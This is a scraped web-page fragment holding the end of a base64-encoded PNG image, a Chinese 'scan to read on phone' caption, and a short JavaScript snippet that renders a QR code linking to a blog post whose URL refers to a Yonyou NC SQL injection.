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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-deleteMenu-deleteOftenMenu-pk-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 